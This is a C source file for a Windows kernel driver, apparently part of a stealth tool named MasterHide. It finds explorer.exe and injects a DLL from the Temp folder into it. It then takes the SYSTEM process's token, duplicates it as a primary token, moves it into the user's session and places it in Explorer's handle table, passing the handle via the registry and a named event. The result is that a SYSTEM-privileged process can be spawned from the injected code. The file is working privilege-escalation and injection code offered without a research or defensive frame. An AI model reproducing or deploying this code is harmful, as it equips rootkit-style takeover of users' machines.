#include "Phase2Bridge.h"
#include "..\..\windows-kernel-dll-injector\DLLInjector\DLLInjector\Injector.h"

// ---------------------------------------------------------------------------
// Missing type definitions (only if not already present)
// ---------------------------------------------------------------------------
#ifndef TOKEN_TYPE
typedef enum _TOKEN_TYPE {
    TokenPrimary = 1,
    TokenImpersonation
} TOKEN_TYPE;
#endif

#ifndef TOKEN_INFORMATION_CLASS
typedef enum _TOKEN_INFORMATION_CLASS {
    TokenSessionId = 12        // only one we need
} TOKEN_INFORMATION_CLASS;
#endif

// ---------------------------------------------------------------------------
// Missing constants (guard against redefinitions)
// ---------------------------------------------------------------------------
#ifndef PROCESS_QUERY_INFORMATION
#define PROCESS_QUERY_INFORMATION   0x0400
#endif
#ifndef PROCESS_DUP_HANDLE
#define PROCESS_DUP_HANDLE          0x0040
#endif
#ifndef TOKEN_DUPLICATE
#define TOKEN_DUPLICATE             0x0002
#endif
#ifndef TOKEN_QUERY
#define TOKEN_QUERY                 0x0008
#endif
#ifndef TOKEN_ADJUST_SESSIONID
#define TOKEN_ADJUST_SESSIONID      0x0100
#endif
#ifndef TOKEN_ASSIGN_PRIMARY
#define TOKEN_ASSIGN_PRIMARY        0x0001
#endif
#ifndef TOKEN_ALL_ACCESS
#define TOKEN_ALL_ACCESS            0x000F01FF
#endif
#ifndef EVENT_ALL_ACCESS
#define EVENT_ALL_ACCESS            0x1F0003
#endif

// ---------------------------------------------------------------------------
// Function prototypes for the few APIs we use that aren't already declared
// ---------------------------------------------------------------------------
NTSYSAPI NTSTATUS NTAPI PsLookupProcessByProcessId(
    _In_ HANDLE ProcessId,
    _Out_ PEPROCESS *Process
);

NTSYSAPI NTSTATUS NTAPI ObOpenObjectByPointer(
    _In_ PVOID Object,
    _In_ ULONG HandleAttributes,
    _In_opt_ PACCESS_STATE PassedAccessState,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_TYPE ObjectType,
    _In_ KPROCESSOR_MODE AccessMode,
    _Out_ PHANDLE Handle
);
NTSYSAPI NTSTATUS NTAPI ZwQueryInformationProcess(
    _In_ HANDLE ProcessHandle,
    _In_ PROCESSINFOCLASS ProcessInformationClass,
    _Out_writes_bytes_(ProcessInformationLength) PVOID ProcessInformation,
    _In_ ULONG ProcessInformationLength,
    _Out_opt_ PULONG ReturnLength
);

NTSYSAPI NTSTATUS NTAPI ZwOpenProcessTokenEx(
    _In_ HANDLE ProcessHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _Out_ PHANDLE TokenHandle
);

NTSYSAPI NTSTATUS NTAPI ZwDuplicateToken(
    _In_ HANDLE ExistingTokenHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ BOOLEAN EffectiveOnly,
    _In_ TOKEN_TYPE TokenType,
    _Out_ PHANDLE NewTokenHandle
);

NTSYSAPI NTSTATUS NTAPI ZwSetInformationToken(
    _In_ HANDLE TokenHandle,
    _In_ TOKEN_INFORMATION_CLASS TokenInformationClass,
    _In_reads_bytes_(TokenInformationLength) PVOID TokenInformation,
    _In_ ULONG TokenInformationLength
);

NTSYSAPI NTSTATUS NTAPI ZwDuplicateObject(
    _In_ HANDLE SourceProcessHandle,
    _In_ HANDLE SourceHandle,
    _In_ HANDLE TargetProcessHandle,
    _Out_ PHANDLE TargetHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ ULONG HandleAttributes,
    _In_ ULONG Options
);

NTSYSAPI NTSTATUS NTAPI ZwCreateEvent(
    _Out_ PHANDLE EventHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes,
    _In_ EVENT_TYPE EventType,
    _In_ BOOLEAN InitialState
);

NTSYSAPI NTSTATUS NTAPI ZwOpenEvent(
    _Out_ PHANDLE EventHandle,
    _In_ ACCESS_MASK DesiredAccess,
    _In_ POBJECT_ATTRIBUTES ObjectAttributes
);

NTSYSAPI NTSTATUS NTAPI ZwSetEvent(
    _In_ HANDLE EventHandle,
    _Out_opt_ PLONG PreviousState
);

// ---------------------------------------------------------------------------
// Original definitions
// ---------------------------------------------------------------------------
#define SystemProcessInformation 5
#define PHASE2_POOL_TAG 'B2HP'
#include <ntstrsafe.h>

extern volatile LONG g_Phase2ExplorerLoaderReady;
extern volatile LONG g_Phase2ExplorerInjectionIssued;
extern HANDLE g_Phase2TargetExplorerPid;

NTSTATUS WriteCheckpoint(_In_ const char* Stage)
{
    UNICODE_STRING keyPath;
    RtlInitUnicodeString(&keyPath,
        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\MasterHide");
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &keyPath,
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    HANDLE hKey = NULL;
    NTSTATUS status = ZwOpenKey(&hKey, KEY_SET_VALUE, &objAttr);
    if (!NT_SUCCESS(status)) return status;
    UNICODE_STRING valueName;
    RtlInitUnicodeString(&valueName, L"InjectionStatus");
    ANSI_STRING ansiStr;
    RtlInitAnsiString(&ansiStr, Stage);
    WCHAR buf[128];
    UNICODE_STRING uniStr;
    uniStr.Buffer = buf;
    uniStr.MaximumLength = sizeof(buf);
    uniStr.Length = 0;
    for (ULONG i = 0; i < ansiStr.Length && (i * sizeof(WCHAR) < sizeof(buf) - sizeof(WCHAR)); i++) {
        uniStr.Buffer[i] = (WCHAR)ansiStr.Buffer[i];
        uniStr.Length += sizeof(WCHAR);
    }
    uniStr.Buffer[uniStr.Length / sizeof(WCHAR)] = L'\0';
    status = ZwSetValueKey(hKey, &valueName, 0, REG_SZ,
                           uniStr.Buffer, uniStr.Length + sizeof(WCHAR));
    ZwClose(hKey);
    return status;
}

static NTSTATUS WriteDwordValue(_In_ LPCWSTR valueName, _In_ DWORD value)
{
    UNICODE_STRING keyPath;
    RtlInitUnicodeString(&keyPath,
        L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\MasterHide");
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &keyPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
    HANDLE hKey = NULL;
    NTSTATUS status = ZwOpenKey(&hKey, KEY_SET_VALUE, &objAttr);
    if (!NT_SUCCESS(status)) return status;
    UNICODE_STRING valName;
    RtlInitUnicodeString(&valName, valueName);
    status = ZwSetValueKey(hKey, &valName, 0, REG_DWORD, &value, sizeof(DWORD));
    ZwClose(hKey);
    return status;
}

static NTSTATUS WriteCheckpointWithStatus(_In_ const char* Stage, _In_ NTSTATUS Status)
{
    CHAR buffer[128];
    NTSTATUS formatStatus = RtlStringCbPrintfA(buffer, sizeof(buffer), "%s 0x%08X", Stage, Status);
    if (!NT_SUCCESS(formatStatus)) return WriteCheckpoint(Stage);
    return WriteCheckpoint(buffer);
}

typedef struct _PHASE2_SYSTEM_PROCESS_INFORMATION {
    ULONG NextEntryOffset;
    ULONG NumberOfThreads;
    LARGE_INTEGER WorkingSetPrivateSize;
    ULONG HardFaultCount;
    ULONG Reserved1;
    LARGE_INTEGER CycleTime;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER UserTime;
    LARGE_INTEGER KernelTime;
    UNICODE_STRING ImageName;
    KPRIORITY BasePriority;
    HANDLE ProcessId;
    HANDLE ParentProcessId;
    ULONG HandleCount;
    ULONG SessionId;
} PHASE2_SYSTEM_PROCESS_INFORMATION, *PPHASE2_SYSTEM_PROCESS_INFORMATION;

NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation(
    _In_ ULONG SystemInformationClass,
    _Out_writes_bytes_opt_(SystemInformationLength) PVOID SystemInformation,
    _In_ ULONG SystemInformationLength,
    _Out_opt_ PULONG ReturnLength
);

static NTSTATUS FindTargetProcessId(_Out_ PHANDLE Pid);
static NTSTATUS WaitForExplorerLoaderReady(void);

// ---------------------------------------------------------------------------
// Kernel‑side token‑passing spawner (registry + event)
// ---------------------------------------------------------------------------
NTSTATUS Phase2_SpawnSystemJtl(void)
{
    NTSTATUS status;
    PEPROCESS pExplorer = NULL;
    HANDLE hExplorer = NULL;
    PROCESS_SESSION_INFORMATION sessionInfo = {0};
    ULONG sessionId = 0;
    HANDLE hSystemToken = NULL;
    HANDLE hDupToken = NULL;
    HANDLE hRemoteToken = NULL;
    HANDLE hEvent = NULL;
    UNICODE_STRING eventName;
    WCHAR eventNameBuffer[128];

    DbgPrint("[SpawnJtl] Starting token-pass for Explorer PID=%p\n", g_Phase2TargetExplorerPid);

    if (g_Phase2TargetExplorerPid == NULL) {
        WriteCheckpoint("SpawnJtl: no explorer PID");
        return STATUS_NOT_FOUND;
    }

    // 1. Open Explorer with PROCESS_DUP_HANDLE and PROCESS_QUERY_INFORMATION
    status = PsLookupProcessByProcessId(g_Phase2TargetExplorerPid, &pExplorer);
    if (!NT_SUCCESS(status)) { WriteCheckpointWithStatus("SpawnJtl: PsLookup failed", status); return status; }

    status = ObOpenObjectByPointer(pExplorer, OBJ_KERNEL_HANDLE, NULL,
                                   PROCESS_DUP_HANDLE | PROCESS_QUERY_INFORMATION,
                                   *PsProcessType, KernelMode, &hExplorer);
    ObDereferenceObject(pExplorer);
    if (!NT_SUCCESS(status)) { WriteCheckpointWithStatus("SpawnJtl: Open explorer failed", status); return status; }

    // 2. Get Explorer's session ID
    status = ZwQueryInformationProcess(hExplorer, ProcessSessionInformation,
                                       &sessionInfo, sizeof(sessionInfo), NULL);
    if (!NT_SUCCESS(status) || sessionInfo.SessionId == 0) {
        WriteCheckpointWithStatus("SpawnJtl: invalid session", status);
        ZwClose(hExplorer);
        return STATUS_UNSUCCESSFUL;
    }
    sessionId = sessionInfo.SessionId;
    DbgPrint("[SpawnJtl] Explorer session = %u\n", sessionId);

    // 3. Get SYSTEM token from PID 4
    PEPROCESS pSystem = NULL;
    status = PsLookupProcessByProcessId(ULongToHandle(4), &pSystem);
    if (!NT_SUCCESS(status)) { ZwClose(hExplorer); WriteCheckpointWithStatus("SpawnJtl: PsLookup(4) failed", status); return status; }

    HANDLE hSystemProcess = NULL;
    status = ObOpenObjectByPointer(pSystem, OBJ_KERNEL_HANDLE, NULL,
                                   PROCESS_QUERY_INFORMATION,
                                   *PsProcessType, KernelMode, &hSystemProcess);
    ObDereferenceObject(pSystem);
    if (!NT_SUCCESS(status)) { ZwClose(hExplorer); WriteCheckpointWithStatus("SpawnJtl: Open system failed", status); return status; }

    status = ZwOpenProcessTokenEx(hSystemProcess,
                                  TOKEN_DUPLICATE | TOKEN_ADJUST_SESSIONID,
                                  OBJ_KERNEL_HANDLE, &hSystemToken);
    ZwClose(hSystemProcess);
    if (!NT_SUCCESS(status)) { ZwClose(hExplorer); WriteCheckpointWithStatus("SpawnJtl: ZwOpenProcessTokenEx failed", status); return status; }

    // 4. Duplicate as primary token
    OBJECT_ATTRIBUTES oa = RTL_CONSTANT_OBJECT_ATTRIBUTES(NULL, OBJ_KERNEL_HANDLE);
    status = ZwDuplicateToken(hSystemToken, TOKEN_ALL_ACCESS, &oa, FALSE, TokenPrimary, &hDupToken);
    ZwClose(hSystemToken);
    if (!NT_SUCCESS(status)) { ZwClose(hExplorer); WriteCheckpointWithStatus("SpawnJtl: ZwDuplicateToken failed", status); return status; }

    // 5. Set the token's session ID to match Explorer's session
    status = ZwSetInformationToken(hDupToken, TokenSessionId, &sessionId, sizeof(sessionId));
    if (!NT_SUCCESS(status)) {
        WriteCheckpointWithStatus("SpawnJtl: Set session ID failed", status);
        ZwClose(hDupToken); ZwClose(hExplorer);
        return status;
    }

    // 6. Duplicate the token into Explorer's handle table
    //    The source process is our own process (kernel driver)
    status = ZwDuplicateObject(NtCurrentProcess(),   // SourceProcessHandle
                                hDupToken,            // SourceHandle
                                hExplorer,            // TargetProcessHandle
                                &hRemoteToken,        // TargetHandle
                                TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_SESSIONID,
                                0,                    // HandleAttributes
                                0);                   // Options
    DbgPrint("[SpawnJtl] ZwDuplicateObject(remote) => 0x%08X, remoteHandle=%p\n", status, hRemoteToken);
    if (!NT_SUCCESS(status)) {
        WriteCheckpointWithStatus("SpawnJtl: Duplicate token into explorer failed", status);
        ZwClose(hDupToken); ZwClose(hExplorer);
        return status;
    }

    // 7. Write the remote handle value to registry (REG_DWORD)
    DWORD handleValue = (DWORD)(ULONG_PTR)hRemoteToken;
    status = WriteDwordValue(L"TokenHandle", handleValue);
    DbgPrint("[SpawnJtl] Wrote TokenHandle=%lu to registry, status=0x%08X\n", handleValue, status);

    // 8. Create or open the event in Explorer's session namespace
    RtlStringCbPrintfW(eventNameBuffer, sizeof(eventNameBuffer),
                       L"\\Sessions\\%u\\BaseNamedObjects\\MasterHideSpawnEvent", sessionId);
    RtlInitUnicodeString(&eventName, eventNameBuffer);
    DbgPrint("[SpawnJtl] Event name = %wZ\n", &eventName);

    OBJECT_ATTRIBUTES eventObjAttr;
    InitializeObjectAttributes(&eventObjAttr, &eventName,
                               OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = ZwOpenEvent(&hEvent, EVENT_ALL_ACCESS, &eventObjAttr);
    if (!NT_SUCCESS(status)) {
        status = ZwCreateEvent(&hEvent, EVENT_ALL_ACCESS, &eventObjAttr,
                               SynchronizationEvent, FALSE);
    }
    if (NT_SUCCESS(status)) {
        ZwSetEvent(hEvent, NULL);
        ZwClose(hEvent);
        DbgPrint("[SpawnJtl] Event set successfully.\n");
    } else {
        DbgPrint("[SpawnJtl] Failed to create/open event: 0x%08X\n", status);
    }

    // Cleanup
    ZwClose(hDupToken);
    ZwClose(hExplorer);

    WriteCheckpoint("SpawnJtl: token passed to explorer via registry");
    return status;
}

// ---------------------------------------------------------------------------
// Phase2 injection logic (annotations added)
// ---------------------------------------------------------------------------
NTSTATUS Phase2_TriggerInjection(void)
{
    WriteCheckpoint("Phase2 entered (startup)");
    HANDLE targetPid = NULL;
    NTSTATUS status = FindTargetProcessId(&targetPid);
    if (!NT_SUCCESS(status)) {
        WriteCheckpointWithStatus("FindTargetProcessId failed", status);
        return status;
    }
    g_Phase2TargetExplorerPid = targetPid;
    return Phase2_TriggerInjectionForPid(targetPid, FALSE);
}

NTSTATUS Phase2_TriggerInjectionForPid(_In_ HANDLE Pid, _In_ BOOLEAN WaitForLoader)
{
    WriteCheckpoint("Phase2 entered (pid)");
    if (Pid == NULL) {
        WriteCheckpoint("Invalid pid");
        return STATUS_INVALID_PARAMETER;
    }

    if (WaitForLoader) {
        NTSTATUS waitStatus = WaitForExplorerLoaderReady();
        if (!NT_SUCCESS(waitStatus) && waitStatus != STATUS_TIMEOUT) {
            WriteCheckpointWithStatus("Explorer loader wait failed", waitStatus);
            return waitStatus;
        }
        if (!g_Phase2ExplorerLoaderReady) {
            WriteCheckpoint("Explorer loader not ready");
            return STATUS_PENDING;
        }
    } else {
        InterlockedExchange(&g_Phase2ExplorerLoaderReady, 1);
    }

    if (InterlockedCompareExchange(&g_Phase2ExplorerInjectionIssued, 1, 0) != 0) {
        WriteCheckpoint("Injection already issued");
        return STATUS_ALREADY_COMMITTED;
    }

    UNICODE_STRING dllPath = RTL_CONSTANT_STRING(L"C:\\Windows\\Temp\\inject.dll");
    NTSTATUS status = InjectDllIntoProcess(Pid, &dllPath);
    if (!NT_SUCCESS(status)) {
        InterlockedExchange(&g_Phase2ExplorerInjectionIssued, 0);
        return status;
    }
    WriteCheckpoint("Injection confirmed");

    NTSTATUS spawnStatus = Phase2_SpawnSystemJtl();
    DbgPrint("[Phase2] SpawnJtl returned 0x%08X\n", spawnStatus);
    return status;
}

static NTSTATUS WaitForExplorerLoaderReady(void)
{
    LARGE_INTEGER interval; interval.QuadPart = -50 * 10000;
    for (ULONG attempt = 0; attempt < 20; ++attempt) {
        if (g_Phase2ExplorerLoaderReady) return STATUS_SUCCESS;
        KeDelayExecutionThread(KernelMode, FALSE, &interval);
    }
    return STATUS_TIMEOUT;
}

static NTSTATUS FindTargetProcessId(_Out_ PHANDLE Pid)
{
    PVOID processBuffer = NULL;
    SIZE_T processBufferSize = 0x10000;
    UNICODE_STRING targetName = RTL_CONSTANT_STRING(L"explorer.exe");
    NTSTATUS status;
    if (Pid == NULL) return STATUS_INVALID_PARAMETER;
    *Pid = NULL;

    for (;;) {
        processBuffer = ExAllocatePool2(POOL_FLAG_PAGED, processBufferSize, PHASE2_POOL_TAG);
        if (processBuffer == NULL) return STATUS_INSUFFICIENT_RESOURCES;
        status = ZwQuerySystemInformation(SystemProcessInformation, processBuffer, (ULONG)processBufferSize, NULL);
        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            ExFreePool(processBuffer); processBuffer = NULL; processBufferSize += 0x10000; continue;
        }
        break;
    }

    if (NT_SUCCESS(status)) {
        PPHASE2_SYSTEM_PROCESS_INFORMATION process = (PPHASE2_SYSTEM_PROCESS_INFORMATION)processBuffer;
        for (;;) {
            if (process->ImageName.Buffer != NULL && process->SessionId != 0) {
                USHORT nameStart = process->ImageName.Length / sizeof(WCHAR);
                while (nameStart > 0) {
                    const WCHAR ch = process->ImageName.Buffer[nameStart - 1];
                    if (ch == L'\\' || ch == L'/') break;
                    --nameStart;
                }
                UNICODE_STRING baseName;
                baseName.Buffer = process->ImageName.Buffer + nameStart;
                baseName.Length = process->ImageName.Length - (nameStart * sizeof(WCHAR));
                baseName.MaximumLength = baseName.Length;
                if (RtlEqualUnicodeString(&baseName, &targetName, TRUE)) {
                    *Pid = process->ProcessId; status = STATUS_SUCCESS; break;
                }
            }
            if (process->NextEntryOffset == 0) { status = STATUS_NOT_FOUND; break; }
            process = (PPHASE2_SYSTEM_PROCESS_INFORMATION)((PUCHAR)process + process->NextEntryOffset);
        }
    }
    if (processBuffer) ExFreePool(processBuffer);
    return status;
}